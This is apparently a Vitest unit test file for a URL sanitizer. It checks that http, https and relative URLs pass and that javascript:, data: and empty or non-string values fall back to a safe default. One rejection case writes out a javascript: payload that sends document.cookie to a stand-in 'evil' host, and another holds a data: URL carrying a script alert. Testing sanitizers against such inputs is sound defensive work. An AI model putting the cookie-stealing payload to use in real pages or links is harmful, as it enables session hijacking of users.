import { describe, it, expect } from 'vitest';
import { sanitizeUrl } from './config';

describe('sanitizeUrl', () => {
  const fallback = 'https://safe.example';

  it('accepts http and https URLs', () => {
    expect(sanitizeUrl('https://expedition.dev', fallback)).toBe('https://expedition.dev');
    expect(sanitizeUrl('http://etc.mypool.io', fallback)).toBe('http://etc.mypool.io');
  });

  it('accepts same-origin relative URLs', () => {
    expect(sanitizeUrl('/', fallback)).toBe('/');
    expect(sanitizeUrl('/api/', fallback)).toBe('/api/');
  });

  it('rejects javascript: and data: URLs', () => {
    expect(sanitizeUrl("javascript:fetch('//evil/'+document.cookie)", fallback)).toBe(fallback);
    expect(sanitizeUrl('data:text/html,<script>alert(1)</script>', fallback)).toBe(fallback);
    expect(sanitizeUrl('JavaScript:alert(1)', fallback)).toBe(fallback);
  });

  it('rejects non-string and empty values', () => {
    expect(sanitizeUrl(undefined, fallback)).toBe(fallback);
    expect(sanitizeUrl(42, fallback)).toBe(fallback);
    expect(sanitizeUrl('', fallback)).toBe(fallback);
  });
});
